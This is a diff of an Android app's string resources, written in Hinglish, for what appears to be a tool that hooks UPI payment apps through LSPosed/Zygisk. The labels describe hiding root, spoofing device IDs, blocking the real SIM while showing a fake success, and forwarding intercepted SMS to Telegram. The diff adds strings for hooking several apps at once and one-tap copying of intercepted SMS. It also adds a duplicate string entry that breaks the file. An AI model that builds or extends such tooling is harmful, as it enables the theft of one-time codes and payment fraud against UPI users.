@@ -46,8 +46,8 @@
     <string name="select_all_upi">Select All Apps</string>
     <string name="deselect_all_upi">Deselect All</string>
     <string name="save_upi_hooks">Save UPI Hooks</string>
-    <string name="upi_framework_scope_hint">Save = LSPosed jaisa: sirf selected app + Framework/Messages/GMS auto hook</string>
-    <string name="upi_hooks_saved">✅ Saved — app hooked + Framework active. Reboot, phir START HOOK.</string>
+    <string name="upi_framework_scope_hint">Select = auto hook sab apps · Save = Framework/GMS/Messages active</string>
+    <string name="upi_hooks_saved">✅ %1$d apps hooked — reboot, phir koi bhi selected app kholo</string>
     <string name="select_upi_app_first">Pehle UPI tab me kam se kam 1 app select karo</string>
     <string name="upi_selected_count">%1$d apps selected for hook</string>
     <string name="system_sim_config">System SIM Card Configuration</string>
@@ -91,7 +91,9 @@
     <string name="intercept_fake_success">Block Real SIM + Fake Success</string>
     <string name="lsposed_compat_hint">LSPosed / Zygisk Next use karte ho? SYSTEM → Not Root + Not Developer OFF rakho.</string>
     <string name="fake_intercept_telegram">Fake Intercept → Telegram (enable/disable)</string>
+    <string name="telegram_tap_copy_hint">Telegram pe SMS ek tap me copy — code block + phone clipboard</string>
     <string name="telegram_test_activated">Test bheja — Telegram check karo (MODULE ACTIVATED)</string>
+    <string name="telegram_test_not_active">Test bheja — NOT ACTIVATE (settings check karo)</string>
     <string name="telegram_test_not_active">Test bheja — NOT ACTIVATE (settings check karo)</string>
     <string name="sender_id">Sender ID:</string>
     <string name="message_body">Message Body:</string>
@@ -158,6 +160,8 @@
     <string name="start_hook_app_success">%1$s hooked — app dubara kholo</string>
     <string name="active_hook_none">App: None</string>
     <string name="active_hook_app">App: %1$s</string>
+    <string name="active_hook_multi">%1$d apps hooked</string>
+    <string name="start_hook_all_success">✅ %1$d apps hooked — sab selected apps auto hook ON</string>
     <string name="telegram_menu_hint"></string>
     <string name="start_hook_success">✅ Start Successful — All Hooks Ready\nZygisk injected · SMS · UPI · Root Hide · Device ID active</string>
     <string name="hook_status_incoming_on">Hook Incoming SMS: ON</string>
